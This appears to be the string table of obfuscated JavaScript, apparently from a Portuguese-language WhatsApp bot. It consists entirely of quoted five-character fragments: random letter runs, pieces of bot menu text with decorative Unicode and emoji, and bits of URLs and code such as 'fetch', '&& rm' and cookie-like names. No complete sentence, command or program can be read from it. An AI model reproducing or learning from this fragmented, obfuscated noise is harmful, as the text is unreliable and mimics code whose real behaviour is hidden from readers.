'IKyGd', 'EUGWy', 'WqIiP', 'i.seg', "los d", 'iuhrA', 'VQkDM', 'eYdzQ', 'ZvBuS', 'GzPqy', 'SCpcB', 'uelo', 'EWXeg', 'x0dx/', 'jVUDB', 'uVtzn', "aram ", 'WVJtX', "Que g", 'jIcix', "M pod", 'obAAW', 'lvcOV', 'ngeir', 'cOVLM', 'NoBBb', "\n𖣘⃟ᗒ C", 'bDubi', "% \n", "ste p", "OBU ❄️", 'le.', 'RsLPM', 'atrap', 'IeVAw', 'NomeD', 'cYdnK', 'LTrdL', "ato n", 'im??', 'iPGIJ', 'estõe', 'ubJBB', "der c", 'CchaC', 'Etthn', 'h/360', 'BBIYC', "ou te", 'NAGRo', 'as.', 'en?ty', 'ceil', "azo d", 'SgVfP', 'r-f', 'jABlV', "no ut", 'fNkIa', 'zVyZp', 'IAXgj', 'OFyJf', 'quinh', " Cleo", "O Reg", " MERE", "\n1. 📍", 'tsSTc', 'fwPcE', "md né", 'rua', 'UhCoI', 'tus2', 'YOOZK', 'eGdGT', " bot,", 'igSCd', 'dnagA', 'Mnzul', 'XWHBv', " sent", 'amVOz', 'YUxGQ', 'wAvFQ', 'rfcak', 'al%20', 'xICgz', 'nText', "「* Ad", "𝐔 𝐔́𝐍𝐈", 'iando', "o sim", 'mOpnf', " DOS ", 'realm', 'pGKla', 'yRMHB', 'figus', 'gFHFf', '𝐌𝐀𝐑𝐓𝐈', "*Olá ", 'gpt2', 'votar', "o nes", '.jpg', "𝐎𝐒 𝐀𝐋", "r o e", 'Agent', 'ized', " inex", "𝐀𝐒𝟏 ❄️", 'omuni', 'bla', 'NDlDH', "ave P", "+18 0", 'KHvKF', 'KgiQi', 'Wxjho', "o ou ", 'Topeo', 'uwiTd', 'entam', " sint", '𝐀𝐓𝐈𝐕𝐀', 'kNlSZ', 'WVVrQ', 'JImAd', 'cCkCB', 'uMHlO', 'evLDK', 'RjBCP', "ara i", 'Yibhu', 'OlJzn', 'XDiGd', 'ando:', 'TXWby', 'SMHHV', "𝗔𝗧𝗢 🇯🇵", 'hmm..', "i air", " sair", "da di", "\nhttp", ". Ace", "14. ❄️", "idos ", 'bolao', 'UAgYw', 'xVZru', "app ,", 'nimet', 'IQagT', 'nsfww', 'vBMQJ', 'qgqXz', 'warn', 'TyPxP', " most", 'cWfFs', 'sendo', 'BMRzr', 'UKAzN', 'EYBLh', "has p", 'MPQAB', 'KGhGB', "]* ", 'oZeGy', 'vNgbZ', '~_*PE', 'lJSdf', 'mbro', 'e.jso', 'Xyobe', 'htMWA', 'cup', 'ccgol', 'mpdiS', "s e g", " pess", 'xjlvB', 'me=0', "e 🏆\n\n", 'ORPNk', 'khdcS', 'YrElx', 'red', "ador ", 'cluíd', 'fdfrr', " ུ\n  ", 'GTbop', 'QbcXS', 'FSpye', "enos ", 'bCtvk', 'uport', 'gos/l', 'WEkFD', 'ns/ar', 'fBwIJ', 'Vídeo', "_6: O", 'fmEjz', 'tVmeH', " 🎥\n11", " 𝟰𝟴𝟬𝗣", '12:00', 'eRczC', "é. Po", 'DnkBC', 'novo,', 'jbJIo', 'rmaçõ', 'jonld', 'LmiIC', " no @", 'ker', 'XiETw', 'stema', 'dalis', 'UzowU', 'ojkyy', 'Teste', "ma De", 'todas', 'szap', 'gGjuF', "ode s", 'wLpyJ', 'UaRCa', 'KNuxR', 'gJxTv', 'Drago', 'kIghV', "o par", 'tenci', "s eng", "zer o", 'n/x-w', 'LERTA', 'WzVfW', '3|1|2', 'qjCHJ', '.9,as', 'onMes', 'glQrL', 'ttp2', 'rpceN', 'nluXa', 'ZfbsU', "ja ba", 'DflBO', 'PoRcd', '05sJX', "\n\n🕹️ M", "ora i", 'MaYie', "\n└───", 'TLFQi', 'okIdg', 'TyzVl', 'memes', 'vXSbC', 'NISTR', 'vUUrl', 'com', 'MAYLd', 'ifYJq', 'KOgmM', 'efaze', 'LfQsr', 'MWPlX', 'YjdBP', "rio d", 'eddy', 'cdTuk', " VENC", " 2, v", 'jawby', 'JSyXv', 'pinha', 'HepCV', 'FuxNd', 'LDvcX', 'lXvUo', "gem a", "ome c", 'VaRue', 'answe', 'IaFYv', 'fwSwb', "Pela ", 'FfMwR', 'DFQkZ', "!* ✍🏻🤝🏻", "ra ", 'LyVZs', 'rmcmd', 'ão...', 'cYgyK', 'XCKjw', 'kPDvV', 'LzNAY', 'te...', '34d73', 'uindo', 'tifiq', " um p", '★⊱┈╌╌', "UÊS (", 'calc2', 'KVrXr', "ra já", 'mporá', 'ntura', 'nBkem', 'ctRep', 'gold,', 'oipPt', ".\n╰──", 'xRMnF', 'PKXJq', 'keyer', 'pHSfJ', 'sGxrE', 'lavrã', "ós at", 'jJYTN', '.0.si', '0@g.u', "- Em ", 'ptOvd', 'crian', ':VCAR', '/aheg', " Carg", 'ᴀᴠᴇᴄᴏ', 'UMhZE', "Eu So", 'DWeAz', 'lfPGZ', " ao c", 'druga', "essa ", " Imag", 'w.fac', "N AND", 'iOgYq', "eo, u", 'TUDSe', '*Núme', "ê foi", 'locat', 'XrBZi', 'boGmg', "• Tex", 'path', 'oiola', 'ZvupO', "ao co", "me o ", '@goog', 'tOPpb', 'arani', "w do ", 'XotOw', 'JnzzB', 'CnnhG', "𝐙 🔞", 'vvCwN', 'JvZel', '/Torc', "eve s", 'reocu', 'VnJqX', 'ERZ.M', 'iRqMZ', 'iso', "são e", 'viSZZ', 'hSymc', 'QSGnT', "der 5", 'temp', 'hZUSb', 'MISTE', "TE O ", "rda, ", 'nte', 'elar.', 'angry', 'ubAet', 'fJjnx', "i ret", 'GuzUe', 'OGyho', 'vsybD', 'SEBHV', 'GwAHJ', 'serme', 'LKItz', 'egend', 'MRWta', 'mHvia', 'Zvlvg', "𝐊 ❄️", 'lhExH', 'Não*', 'áudio', 'oqeXa', 'qtrVp', "ha a ", 'EmHLp', 'NXKGI', "\nesse", 'nahvr', "aço g", 'wdkg8', " 𝐍𝐔𝐍𝐈", " 「 🔥 ", 'canon', "𝟑 🔞", 'nARCj', 'ysmeY', 'ZcaUU', 'metad', 'ggyGh', 'CVrip', 'LAnBu', 'RPmFa', 'Amiic', 'bHzSz', "ios, ", 'uWhit', 'tsUpd', 'lTLAS', 'on/ro', " 🥳 vo", 'xjugv', 'ExwZu', 'OYbOT', "+/- b", 'qvZhF', " o me", 'IoLQs', '22%25', 'lRxJi', 'iOZPr', "RL: ", 'pZYvK', 'IciMN', 'WuSFT', "FY* 🎙️", 'var6', 'aQNxH', 'JBgAp', "ºc\n│‣", '❄️𝐄𝐬𝐜𝐨', "┉╗\n║ ", " vazi", 'yguVj', ", o m", 'KNrVk', 'PrOac', 'gmGie', 'tupli', 'UHyuU', 'TTNpt', 'FKbHp', "* pod", 'gtXeX', " de M", 'xFbiG', 'Babym', 'UrwfM', "• 💢 *", 'vxxoE', 'link1', 'turbo', 'ENHTr', 'SiZlJ', '𝐎𝐃𝐎+1', 'ScZpq', 'logo:', 'akiuI', '*+/-*', 'SKHgu', "ogou ", 'kXTGM', 'TLYGt', 'rneci', 'wFTpT', "ta, e", " perg", " um c", 'QptBp', "𝗣 🎥", " no Q", '_type', 'aiLJX', 'QJPJc', "Aqui ", "\n\n*O ", 'VsnAd', "O Bot", 'dHVDc', 'njIpk', 'OmYns', "\n▢ *Á", 'tOUEo', 'OQvcu', 'wFYDx', 'mKGwF', 'QhJQK', "m avi", "* aca", 'eLsKH', 'TnCms', 'kZJkB', '0|2|4', 'dyfdc', 'ktgij', "fim n", 'sso!', 'wGGMS', 'onced', 'wwCWk', 'zwOAL', "1. 🕹️ ", 'urdif', 'meLBh', " SANE", 'iello', 'lKWYb', 'hCeKm', 'hQokT', "el e ", "rar n", "𝐈 𝐋𝐈𝐍", 'cKihX', 'com/s', 'ezuJO', 'FUCyr', 'LRfhG', 'GWNSa', 'DerOs', 'jREVq', " CORN", 'hHCfl', "🎥 𝐎𝐏𝐂̧", 'kZWio', '1548b', 'ItiEn', 'kxQfZ', 'eWIWh', 'oUpZY', 'RdvXt', 'lNpcQ', '(3).j', 'ghxkl', 'rMmPx', "rde 🌅", 'aVzEN', 'Escra', 'aalka', "old, ", '_-_-_', 'LScrF', 'uler', "𝐕𝐀𝐑 𝐁", '-menu', 'YBekq', 'lzxgK', "56. ❄️", 'xrxrP', 'WboOd', 'Uwfjw', 'RHcHd', "o atu", 'BZcpR', '◈✼❄️✼◈', 'fWhhp', 'JUyLL', "o o a", 'FBbHr', 'epH7A', 'uZNtc', 'aBarb', "• Dur", "bot  ", 'LnJfS', 'situa', "em em", 'QTHBE', 'pdKcF', 'TADO.', 'TRXay', 'Alinn', 'TFkuL', 'xpira', "(a)* ", " 🤓 」\n", "rque ", 'wEhPh', 'quead', '.opac', " ), B", 'OKExU', "er no", " RICH", "to - ", 'ZWIMA', "um co", 'nte..', 'UOPau', '/ero/', 'ndex', "cmd 1", 'X_GAM', 'nMoRA', 'YlQnI', 'Dono:', 'toStr', 'zcygf', 'mWkeV', 'APDyg', "oar a", 'urce', " Me1A", 'isiçã', " paga", 'sZdhb', 'TfQHg', 'rXWNE', '𝐔𝐏𝐎𝐒:', 'eDkEK', 'neFar', " Vid ", 'zBPAY', "e men", 'domin', 'KSGMc', 'MOKWh', '03285', 'ncmlg', 'NuXzq', "cmd\n\n", 'QmNrH', 'igma:', 'iJwHE', 'clusi', 'th_12', 'YmasB', 'ujBMX', 'otty', "po Po", 'qLyVu', 'erqr', 'ccWYk', "1) p/", 'IZBrz', 'geCon', 'flCBi', 'cing-', 'rPSeb', "gem n", 'aTDFc', " ⚽️\nGo", "ão se", 'OHuMI', 'hVzpJ', 'cwGCd', 'g-aut', 'each', 'max', 'LzxRr', 'e_Hun', 'porqu', 'LgKAy', 'rição', "- 🎧 𝑨", "plo ", 'CtYEy', 'vo.tx', "ou Br", 'oCcxG', "ar a ", "Só em", "Às ve", " Cras", 'rbole', 'mageg', 'sSxiF', 'CDENU', 'ZWnku', 'LdqDW', 'on/', "\n\nGan", " tem,", 'zSpQU', " Dokk", 'kcNuL', "✼┉╝\n╔", 'jogo4', "sa di", 'gsFZr', 'dNTyj', 'rawpp', 'vdbMP', '334', 'YzVQk', 'lQcir', 'tObID', 'Deter', 'BkjCH', " Já e", "ce de", 'qMwBe', 'mSCuk', 'fmEUT', " OBS:", 'OzPsH', 'welco', 'ztcdK', 'Sdjpe', 'uCjff', 'rtida', 'DhKQr', '720d2', '79a4a', 'UNTY', 'aHeXY', "ro fo", 'hSmNp', 'fUFrL', 'Pupgp', 'jVDqc', "a! Vo", " BORU", 'MlNaH', "cê só", 'p/fil', 'uiYAm', 'FoQMb', " ouvi", 'HpXGv', 'JKJyA', "ter g", "rso p", 'FgRuW', 'rubou', " 𝐌𝐄𝐍𝐔", 'wiMoK', "─◉  ◊", "oji d", 'YMpfQ', 'mação', 'tBbqR', 'uelo_', 'le/i0', 'RBSvB', 'UHQBm', "eu me", 'WOvnP', "UPO (", "80. ❄️", 'jDxqO', 'sFrwo', 'QYARa', 'TxOGJ', 'txfRE', 'aDmcT', '//www', "béns ", 'qRNfc', 'PAGUE', '*Info', 'CrsAl', 'QDQcz', 'mdNpn', "bar p", "ão: ", "\n9 - ", "nha m", '/data', 'jwgxJ', 'FLreR', 'eiros', '𝑟𝑒𝑠𝑒𝑛', 'a...', 'gAuxo', "s con", '6Xp1p', 'signo', "𝐂̧𝐀̃𝐎 ❌", 'Nrofg', 'rArTh', 'Uadmt', 'dBjfF', 'wdown', 'peMoi', 'AFoET', '://ez', 'bYDeL', 'uUoCg', 'RTrKQ', 'DCabU', "do >\n", "m alg", 'niFjb', 'YnjYd', "l*\n*o", 'eCGFI', 'fCJQy', " 𝐀𝐋𝐈𝐍", 'Ezsev', 'eIrfx', 'arv', 'ixsOM', "e Far", "a res", 'stanz', 'vzPPP', "ES RO", "date ", "o, vo", 'ttp4', 'gAQHq', 'xRLil', 'LDBrk', 'FcALd', 'mitid', 'rogra', 'MQtrT', 'ffWcZ', 'aOdMT', 'lWqth', 'copy_', 'neko/', 'zZKfS', 're<3', " BOT,", "9. 🔞 ", "✼┉╝  ", 'aPAJZ', 'dos', 'auBpm', 'fDwyU', "e ter", "r inf", 'ECfyV', "o é s", 'delpi', 'cJgpR', 'NtRre', 'culda', "D DO ", "m Vin", 'fRjOb', 'QezOC', 'mZdsg', 'HxNYh', 'DwKwn', 'Venci', '*🎮Ꮐ̸Ꭺ̸Ꮇ̸', 'ccjmG', "\nApro", 'clien', " 🏃‍♂️\nEm", "s cor", 'jBWXz', " do m", "co. P", 'ioo1/', 'ssões', 'zZdpV', 'cUogL', "adas ", 'Fprqk', "el ) ", 'wedkg', "ra na", "*\n\nX ", "lar a", 'AlcOq', 'ciati', '𝐈𝐆𝐔𝐑𝐈', 'NdJcS', 'menud', 'iHDVf', 'xXyjG', "oc 0", "ssa c", " mome", 'TuGSo', 'rTFXR', 'CGJxy', 'MaSZh', 'cOrkD', 'DNNhx', "PO IN", 'Ffpid', 'nt_in', 'AhoFX', 'MkbLt', ", peç", 'infof', "old\n\n", ": \n", "•́ ˶)*", 'gSGkR', " migr", 'obmHC', 'RjYHC', '16-44', 'QoVXa', "uele ", 'fJVqb', 'ointA', "2x, e", "5 ] ", 'kDpIy', '𝐄𝐀𝐓𝐇𝟐', 'YKYeT', 'to_wi', "oi en", 'jJeZU', "sso d", 'KQuew', 'myklv', "31 di", " bem-", 'qqKpx', 'tgFKS', 'qOCYF', 'HWQPE', 'TbGOb', 'DppUw', 'avali', 'totag', "ta ap", "sync ", "𝐌 𝐎 𝐌", "\n*Qua", "va, d", " de u", " Temp", 'agrup', "s açõ", 'xGuYp', 'XNmAo', '0.fon', 'yqsZy', 'hHrOb', 'sg3', 'nheem', 'LggzW', " novo", "lds s", 'aId', 'mG414', "\nmens", 'enFAc', 'Produ', 'Bvmxe', "\nB ", ']atem', 'gHVtc', " desa", 'bqqHq', 'DCASX', 'Joroz', "ink 1", 'NhYTS', "ar vo", 'eomlp', 'OXtcs', "e... ", "OF CL", 'rmado', 'oztkp', 'qfcEo', "oji a", 'OkAbi', 'vjlAi', 'jybOJ', 'WmSoH', 'aoxQk', "u o r", "Uma t", " veja", "use o", '╰┅─•𖧹', '4cadf', "gar v", ", ire", 'DvFVO', "a, ma", 'XBhET', 'XVoZB', 'neqoI', 'QQBBX', 'adeir', 'bgTwJ', 'yIzjb', 'iZVHy', "27. ❄️", 'RQUIV', 'saNIS', "1 e 5", 'BePRG', 'ZRzdW', 'spost', 'y.com', "to! 😍", 'NdjPq', 'hQEEQ', "ar pa", 'artis', " 5 pe", "\nOu e", "ue nã", '4|0|3', 'entos', 'CfqHu', 'nganç', "r tro", "ora e", 'gTHVk', " a Ro", 'ocume', 'uzOLL', 'TAREM', 'lZAbX', 'space', 'dkepB', 'BvFhI', 'WIXub', " 𝐑𝐔𝐓𝐄", 'qbEXT', 'ntida', 'fFXQM', 'KFbvt', 'UaWMw', '0.bac', 'WFEWj', 'nmjdj', 'conti', 'OiV5l', 'vesgo', "DY ❄️\n", 'BBZXP', './sti', 'FsXRq', "o: ", 'okzwT', 'vEvUU', 'ithRS', " Mens", 'IDBCz', 'ntati', " 🙄", '335', 't.0.p', 'kkkkk', 'bPSKV', 'eAxJm', "r ou ", 'GTk=', "por a", 'ofPXy', "d ✧͢⃟ᤢ", "m 6 S", 'liaçã', 'wWpsM', 'imxYD', 'ughte', 'QJQde', 'MCJaA', "es ( ", 'rtare', 'obrig', 'SvavB', 'mIRZv', 'getTr', "_- 2 ", 'oVeiC', "A SER", 'gMoiE', 'JZqxF', 'lfiNm', 'ro-se', 'oNasg', 'YudIX', " , de", "𝐃𝐎𝐍𝐎 ", 'adrug', 'igIIX', 'rxwTN', 'sabqV', "á exi", "x de ", ") alt", " Inic", " conq", 'ubRUM', "*\n*• ", "ais, ", 'preço', 'infel', "✼┉╝\nB", 'movid', 'ZaOGv', 'ePhQU', 'FqOgq', "O adm", "𝐍𝐃𝐀 ❄️", "i inf", 'rDfMh', "á mem", 'neon2', '𝐔𝐌𝐄𝐍𝐓', 'norma', 'szbQi', 'pkqcr', 'BGxoc', "ções ", 'ruEPH', 'xROst', 'acion', 'OvSQE', 'xnFDg', "ça aq", "ta Ms", "ova n", "\n\nExp", 'Wqlf4', 'OoUUJ', ": 'na", "dar c", 'OVuUJ', 'WHDIM', 'kDVSY', 'LUxop', "m del", 'tedRo', 'BHAWv', 'dcVAP', "rs G ", 'jKRRb', 'infos', 'nsTIw', "🇯🇵 𝗧𝗢𝗨", "ada: ", "42. ❄️", 'fire2', 'QrRtU', 'mes1', 'EnCZJ', "e boa", "os ne", 'onado', 'JFqFt', 'KmvoU', "cia.\n", "á o c", "old. ", "plo, ", 'AZfsG', "O arq", 'Eakok', 'eMess', 'tXBzK', 'YARgg', 'QvRcK', "𝐍𝐓𝐈 𝐈", 'qxRIW', 'JnWXf', "nta n", 'tuWel', 'devel', 'arc', 'segun', "old d", 'BXkxg', 'VtAIw', 'urxdE', "|\nExe", '🚨🚨🚨🚨🚨', " MELI", 'hECYk', 'euse', 'EDGeg', 'xalrX', 'xSDns', '|12:0', 'm/Nue', 'stine', 'bTZuO', 'vgRTB', 'dsEFG', 'cZaMw', " das ", " 𝐃𝐀𝐒 ", 'ile/a', 'XCyWU', "❄️ 𝐌𝐄𝐌", 'hvEuT', "z, el", 'ltPxN', "u: ", '0.5*P', "a mut", 'UNE', "eu do", 'XTnzC', 'vargp', "𝐈𝐀 𝐑𝐈", 'yeWWH', "reu a", "as dú", " virg", "ES AO", 'zXJNk', 'TzrLC', 'XqdGO', 'njust', " BOA ", 'KksMN', 'irQNF', " *CAR", " valo", 'gJMAO', 'euqaB', 'Scrip', 'qMQ9o', 'HJbZI', 'Na6TH', 'kGEbj', 'gZBTP', "ay : ", 'MOzBX', 'sApp.', 'HjQOU', 'AeJoE', 'eWcdn', 'elho:', 'trand', "d apó", "*\n*Da", 'HDicV', 'menug', "epo l", "que m", 'rific', 'vCYxp', 'atos*', 'HhlGO', 'invál', 'dJzAc', "o, ca", 'Ydabz', 'bZucj', 'amigo', 'Jncpu', 'Não', 'lates', 'YeWtw', 'ext.0', 'emini', 'apare', "de 10", "ipar ", "ao pr", 'gante', 'ASVSI', 'LzneH', 'MbdSh', 'sKTVF', "xo: ", 'SANUk', "não? ", " 𝐒𝐏𝐀𝐌", 'ii099', 'chMAB', 'ucess', 'YMWet', "o agu", 'sim', 'WALLP', 'NlaMo', "r ESD", 'orte', "ema p", 'OzeQs', 'igsh', 'gelo', 'hYKtr', 'OMAND', 'gixpL', 'JXdIj', 'WvBJO', 'SxSsn', 'dyevC', 'VVWNm', 's/Som', 'or/an', "O \n🪀 ", 'acuXx', 'rOtMy', 'YJGcd', 'mrjHu', 'OptSh', "u cel", 'JclDI', 'não.', 'uNwiQ', 'ilize', ") ser", 'kVxjr', 'JGTmi', 'drKbX', "ig no", 'qxNak', "endo ", 'nMeIx', 'MGISa', 'unAVG', "vo ex", "ar to", '@vita', 'eljhd', 'tdTQZ', 'cudo,', 'WxmyI', 'odajH', 'LwSGW', 'PHlyb', 'hosts', 'gdTeK', "🇯🇵 𝗗𝗘𝗜", 'etime', 'LFBPD', '*COMA', 'RppcR', " 𝐄𝐧𝐜𝐨", 'bbZPk', 'essad', 'eveZS', 'o/%20', 'MmUvw', 'TRldM', "in ma", 'BlMke', " o de", 'espor', 'eRCSf', 'd0bd5', '.back', 'fetch', 'AUXan', 'kfxUx', 'nica', 'noton', 'AjLWz', 'kgdJd', 'coDlu', "ssão ", "ece r", "er Ad", "USAR ", 'HSID', 'FSaxr', 'mioka', '*Horá', "erá s", 'arece', "🟦\nC 🟦", '/mrYZ', 'ErHnK', '𝐈𝐍𝐃𝐄𝐑', 'ario:', 'sIewO', 'GoEWQ', 'uHcOi', 'dvRqW', 'tória', "oi al", 'tiro*', "\n\n*Mi", 'txBly', 'qcIBy', 'dPCtV', 'rSOKe', 'ZlYoo', "❄️ 𝐇𝐀𝐃", "Por s", "𝐍𝐓𝐈 𝐕", 'oKupb', 'toria', 'yWmfz', 'hxzvA', "O - A", 'lento', '21.ap', "alc2 ", 'ecime', 'WyRed', '18:00', 'OYiwD', 'dwnVy', " como", 'gTLiG', 'ldZQN', "🔞 𝐂𝐀𝐑", 'HriwR', 'nome', "ao ac", 'rRPBX', 'text.', 'iXVJX', 'meStr', 'me.', 'mykey', 'MEROS', 'FDfaJ', " Venc", 'eNktM', 'jRCAY', "\n\n_2:", " \n\n- ", '𝐁𝐄𝐈𝐑𝐎', 'bBEQf', 'figpa', 'eUCAo', 'GzLEh', 'ZHhYs', 'le/01', " DADO", 'dWLEM', "á, po", "D 🟦🟦🟦", 'JnUZs', 'oeoiM', 'PbzCF', 'kfhPG', 'GENIO', "Sad P", 'PXooh', 'JWwpo', "guiu ", 'DQvxv', 'nAXko', 'Xjvss', "OS 2 ", 'MIDAS', 'UkkNN', "de Gr", "|_\n\n\t", 'cepti', "Opa: ", 'XpFZl', "ja de", 'GqlFq', "╾╮\n║\n", 'id_ne', "UDO B", "𝐀 𝐂𝐄𝐋", 'gSarH', 'KujfR', 'CATEG', "e o n", "e Mem", 'JwLsa', 'nzdfU', 'florw', 'nt.st', 'UyLQW', 'dBcwL', 'gACgY', 'cYcsK', 'pGVXT', 'nYlyB', "O Nic", 'dGwWL', 'dhNXX', 'cNJkR', 'wMdYi', 'arpro', 'IyYig', 'd/ESD', 'tPMxw', '20DO%', '537.3', "éns! ", 'age_c', 'i.sim', 'Xhcmx', 'sjWvJ', 'sKFRp', 'ckeGG', 'dGTIJ', 'vaHdD', 'AqvDD', 'line,', "io da", "as, m", "ts ak", "𝟓 🔞", " ganh", "O qui", 'Nomes', "❄️ Fig", "po:\n", "sto p", " JA ✅", "s for", 'DynHA', 'mpres', 'AFdCn', 'ça/ca', 'doMbN', 'jufrs', 'QWegO', " por ", 'ClfFp', "a Peg", 'EaITY', " 𝐓𝐎𝐓𝐀", 'SrLNW', "o Ins", 'mGzvD', "os es", 'Choic', 'vcbCz', 'EIcBn', 'ipBFN', 'ctere', 'gneZV', "você ", 'kYBET', "💰    ", 'feJYl', 'packf', 'ICkLd', 'oUzTX', "ão me", 'OxUaU', 'BBCQK', 'peg?p', 'CZyCF', "𝐔𝐓𝐎𝟏 ", " prej", " ta o", 'XFnIh', 'EXWSV', " gran", "𝐓𝐀𝐓𝐎 ", 'qQJcX', 'YVFHb', "er ad", "seu b", 'tsXnu', "pois ", 'lirik', 'urs', 'uSwFL', 'encon', 'hrecP', '.net/', 'hCxhk', '.su/q', 'eTSkK', 'KYcJa', 'AyAks', " a ro", 'tênci', 'WmrED', "𝗦𝗨𝗕𝗔 ", 'Cnvnn', 'ca..', 'wvVZa', "os*\n*", 'x3.pn', 'Mi92L', 'CxuFi', "um re", 'diate', ") @", 'M/YYY', 'OKJiq', 'sNppL', "𝑰𝑶 📀", 'sgkGJ', 'BPfFx', 'KZMtr', "\n\n*Op", 'OLMDV', 'lYtZP', " e o ", '...!', 'fYSot', 'gqsur', 'oid.p', 'e=441', "a: ", 'bmhBZ', 'so(a)', 'Ilw:Q', 'rtenc', 'xmtmD', "vie m", " e os", 'CYYyo', 'isCom', 'rygqs', 'zdGwz', 'ɪᴅᴀᴅᴇ', 'INE_S', 'estav', "+18 9", "ca ab", "    R", "ca!\nE", "10. 🔴", 'DhTeY', "ão fo", "---\n", 'wUCYD', 'CPRhh', 'UfWXG', "S\n\n", 'FBFcz', 'h&srs', 'KNwAp', 'cEIdF', "as fa", 'glitc', '685f6', 'RCMLH', 'vxkOK', ": *@", "~» Vi", 'ingan', 'UJmNW', "nce ", "á gru", "UBOU ", 'Vesgo', 'mUDbd', 'icalU', 'JVGVb', 'UKvlC', 'SnTMn', "te ma", "r, se", 'ohPyb', 'ang', 'jJglP', '9b7d8', 'WyYnS', 'FDJfP', 'sGdzz', 'XyAGv', 'gJgMS', 'butto', 'eZMYT', "❄️ 𝐓𝐀𝐍", 'IkEYu', '🔥Aqui', 'favor', "ais v", 'YZRxl', "dm ou", 'iWhsZ', "Bct l", "──\n│ ", 'eoRWM', "*\n*5 ", 'wYDKt', 'fyHqr', "Cadê ", 'cara_', "s seg", 'now', "\n\n-> ", 'WsaDd', 'pPbrY', "𝐀 𝐅𝐀𝐌", "o ire", 'oIbBF', 'logos', 'iAHTQ', 'perfo', 'us_Sa', "s def", "OGLE ", "A pre", 'GciQj', 'iaesp', 'podem', "s! 🔥 ", 'KgmCz', "\n🔗 *L", 'SYAWz', 'nfTiL', 'xwOTw', 'FNPOS', 'OjpBK', 'dVJrg', 'uJsQd', 'dNBGs', "Brow ", 'rbeYe', 'ARASS', '𝐍𝐔𝐍𝐈𝐙', 'TFPVf', 'QYSyq', 'jDclL', "ja as", 'GTTFw', 'Ydqmj', 'MGbfJ', "é um ", 'zSvOO', 'WXCvg', 'tioRh', 'vado,', 'wvLtj', 'ids', '|4|0', "𝗡𝗞𝗔 🇯🇵", 'elado', 'ngulo', 'jxuBn', 'xkJXP', 'Bonit', 'eBMRZ', " de f", "ível ", " 99 9", "ero* ", "p pra", '.grav', 'PkVsD', 'oGngB', " 5000", 'uUfbq', 'hurCW', 'ekBIh', 'ado', 'nsegu', 'DUXbd', 'tPaSb', "x9 0", '.mp4', "m do ", 'packa', " 𝐀𝐋𝐄𝐀", " após", 'WEKyI', 'RAfZq', 'zxDbH', "de es", 'ZHKjL', 'cpepi', 'tomp3', 'VpdvQ', 'nscre', 'fileN', "&& rm", 'masLC', 'quase', "- Tod", 'da_im', 'xbRog', 'FpNkO', "𝐀𝐓𝐀 ❄️", "oad d", '468b1', 'cGzvK', "❄️ 𝐍𝐀𝐑", " mãos", 'EhtEc', 'gFzIw', 'why', 'ohQnv', "2 Gol", 'RiIlC', 'DsHkl', 'vQdpi', "𝐔𝐒𝟏 ❄️", 'kgrou', "o lin", 'getTi', 'rhFdb', 'kdCKB', 'XDXrH', 'XnLPA', 'o/Usu', '%20%2', 'FiRRy', 'CbvbW', 'uzwzu', " exag", 'werCa', " CC C", "ção e", 'NOknF', 'VhtAk', 'gFWWq', 'lkVpA', 'IkJcM', 'RjrtO', 'bLuNY', "❄️ 𝐋𝐎𝐓", 'avelh', 'emove', "r aci", "- Pat", 'rKilO', 'ersg/', 'RvsKT', 'Posic', 'k4XNA', 'bffiN', 'bnfqc', "21. 🔞", 'mtnrK', 'unban', '𝐎𝐌𝐔𝐍𝐈', 'JYXdE', 'OoUis', 'eqkZ0', 'lay_a', 'kZrsb', 'ivida', 'uPEoN', 'IhKSV', 'usu2', 'leiro', "oa No", "das d", "❄️ 𝐉𝐔𝐉", 'ownia', 'IaKVN', " ou n", "🇯🇵 𝗠𝗜𝗞", 'cXBOV', 'XeVxU', " Não ", "\n*ABE", 'QfHkt', 'CGQKh', "ha um", "os co", "nse w", 'pgVal', 'VxOLW', 'Wcitd', 'LEyWi', 'EEVLq', "m @/5", 'test', 'suces', "ot  \n", 'e_pat', "───┐\n", 'IvCYt', "a o @", 'Xwrmx', 'zGQmg', "* [Ou", 'jlnsG', 'caçõe', 'mTpUI', 'vspKu', 'etorn', "BB) :", "13. 🕹️", 'iária', 'RCADE', 'nativ', 'Ameri', 'kkGqt', " 1 ve", " _\nAe", 'bqWVE', 'yZJCm', 'MJbpo', 'HbkYV', "T (7)", 'VYaCu', 'CRlCx', 'RWbnm', "r let", "RIO P", "ser f", "os fu", 'Ntbum', "AIA D", "ro ao", 'oad', "do Sp", "dio d", '❓Quiz', 'blOch', 'krZae', 'QtJXx', 'hwHoa', 'Dratf', 'afXAQ', 'FqDTR', 'adaso', "@ do ", '𝐀𝐃𝐎:*', "pra i", 'ydMLc', "gano ", 'kfvmQ', 'HbPLY', "gue d", 'TXkgh', 'ip/fi', "o e n", "🕹️\n", 'xeSEF', 'nthAH', 'GyaUh', 'Loejj', "s pre", "seja ", 'qrlAr', 'pdate', "i not", 'NlWBC', "stá\n├", 'CdGQo', 'pLECT', " \n\n📄 ", 'RkRwo', 'ObsLf', 'K88c2', "Sair ", 'IjgSy', "ts me", "a /\nE", 'VfiNW', "orte ", "imo d", "Sua p", 'YDBts', 'm/c/a', 'mBwbQ', 'tedId', 'b943c', 'GFuOX', 'osjNA', " puta", 'OWAWD', ". Ten", 'upos:', "ói de", 't...', " prem", 'Rwobn', 'mJjUq', 'GCZWv', 'GUGGs', 'Akina', 'KeLZY', 'QOmqn', 'match', 'React', "sua d", 'on/ti', '/﹋<,︻', 'eylds', 'ostos', 'vYtmo', 'QKEeO', 'tIdLk', 'Qjqua', 'ivá-l', "ilia ", "le > ", "s ref", 'efloo', "┊ \n┊ ", 'stia', "her q", 'YveBm', 'gif/b', 'ganho', 'tivo,', 'UDcDU', 'doqwx', 'ey=', "s. \"", 'KLMtn', "to: w", 'oogle', 'Gf23E', 'tarcm', 'GZuKe', "NK DE", "1.72'", 'KKLWE', 'JhoQl', 'kLjaX', "de pr", 'HokqO', 'htAjV', 'apk/f', 'iINTo', "O Gru", "e aqu", 'uynYt', 'hTLqe', "•\n📸 •", "s ger", 'fkPgT', 'nal_a', "ste g", 'DvElc', '𝐆𝐑𝐈𝐋𝐒', 'vweFM', 'ZCmRW', "\n║   ", "obal ", 'SOmOj', 'rzeMA', 'pIwdr', 'ln6r3', 'ca-MG', 'UDuYc', 'QUomR', " a ad", " BLOQ", '✼◈༻═┉', 'PfPiZ', 'HngoR', 'SAPIS', " em:*", 'mdkXF', 'pbDDK', 'qpqsx', 'bFxen', 'KJygo', "IVOS ", 'tlKhu', 'pikey', 'O```', 'rYapN', '/nyx8', 'ecome', 'gHTHw', 'sC5ho', 'ype=V', 'nlCjL', 'hRuxF', 'fKODO', "ts na", 